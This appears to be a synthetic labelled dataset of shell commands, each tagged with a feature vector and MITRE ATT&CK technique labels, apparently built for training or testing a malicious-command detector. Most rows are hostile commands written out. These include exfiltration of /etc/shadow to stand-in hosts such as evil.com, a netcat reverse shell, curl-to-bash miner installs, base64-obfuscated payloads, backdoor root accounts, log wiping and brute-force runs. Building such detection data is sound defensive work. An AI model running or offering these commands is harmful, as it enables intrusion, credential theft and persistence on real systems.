cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
locate  wp-config.php  ;  sleep  1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/hostname,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
"ldapsearch  -x  -b  'dc=domain,dc=com'  '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
echo 'd21pYyB1c2VyYWNjb3VudCBsaXN0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
sudo rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'd21pZXhlYy5weSBkb21haW4vYWRtaW46cGFzc0AxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
id -Gn && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh &,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1110_Brute_Force'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""adduser --shell /bin/bash --disabled-password backdoor""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1136_Create_Account'],synthetic
sudo echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1496_Resource_Hijacking'],synthetic
nohup ./pwnkit | echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
groups  $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""echo 'bm1hcCAtc24gMTkyLjE2OC4xLjAvMjQ=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
"bash -c ""useradd -m -s /bin/bash hacker""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1136_Create_Account'],synthetic
sudo echo 'Y3VybCAtcyBodHRwOi8vYzIuYXR0YWNrZXIuY29tL2JlYWNvbiA7ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
whoami /all && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup curl -sL http://evil.com/xmrig | bash &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1496_Resource_Hijacking'],synthetic
time find / -name '*.pem' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
sudo echo 'bWFzc2NhbiAtcDEtNjU1MzUgMTAuMC4wLjAvMjQgLS1yYXRlPTEwMDA=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'Y2F0IH4vLmF3cy9jcmVkZW50aWFscw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
getent group sudo ; chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
top -bn1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"time ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)' | > /dev/null 2>&1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup echo 'cGVybCAtZSAndXNlIFNvY2tldDsgLi4uJw==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup du -sh /var/log &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
arp-scan --localnet && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 1, 1]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo smbclient //10.0.0.5/C$ -U Administrator,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in | chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
sha256sum /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
dmidecode -t system && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup shred -u /var/log/auth.log &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
> ~/.bash_history && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
cat /etc/os-release && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
procdump.exe -ma lsass.exe lsass.dmp ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find / -name 'id_rsa' 2>/dev/null ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.64, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time useradd -m -s /bin/bash hacker ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ip addr show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""adduser --shell /bin/bash --disabled-password backdoor""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1136_Create_Account'],synthetic
time echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find / -perm -4000 -type f 2>/dev/null ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
lsb_release -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcLi4uJyAtTmFtZSBQZXJzaXN0IC1WYWx1ZSAnQzpccGF5bG9hZC5leGUn' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
dmidecode -t system | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup systemctl enable --now malicious.service &,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1053_Scheduled_Task'],synthetic
time at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1053_Scheduled_Task'],synthetic
nohup nbtscan 192.168.1.0/24 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
time net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
time unshadow /etc/passwd /etc/shadow > crackme | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
Get-LocalGroupMember -Group Administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
env | grep PATH,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['BENIGN'],synthetic
"bash -c ""nc -e /bin/bash attacker.com 80""","[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""uname -a""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1082_System_Information_Discovery'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
nohup ./pwnkit &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'cHNleGVjLnB5IEFkbWluaXN0cmF0b3I6cGFzc3dvcmRAMTAuMC4wLjUgY21kLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
uname -a && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.0, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh ; history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time cat /etc/network/interfaces,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
./CVE-2021-4034 | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'aWQgLUdu' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time curl -X POST http://evil.com/collect -d @/etc/shadow | history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl  -A  'Mozilla/5.0'  http://c2.attacker.com/check-in  |  sleep  1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Li9DVkUtMjAyMS00MDM0IHwgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'YXJwLXNjYW4gLS1sb2NhbG5ldA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
locate wp-config.php | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
service apache2 status,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbiAmJiBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
./dirtycow  /etc/passwd  'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nohup echo 'bmJ0c2NhbiAxOTIuMTY4LjEuMC8yNCA7IGVjaG8gZG9uZQ==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
id | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.16, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ./pwnkit &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nohup curl -s http://c2.attacker.com/beacon &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nohup masscan -p1-65535 10.0.0.0/24 --rate=1000 && sleep 1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
time echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJiAmJiA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '' > /var/log/syslog | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo whoami /all,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
reg  delete  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  /v  Defender  |  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./CVE-2021-4034 | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ssh  -L  8080:internal:80  user@jump.host,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
cat ~/.ssh/id_rsa,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
cat /proc/version ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
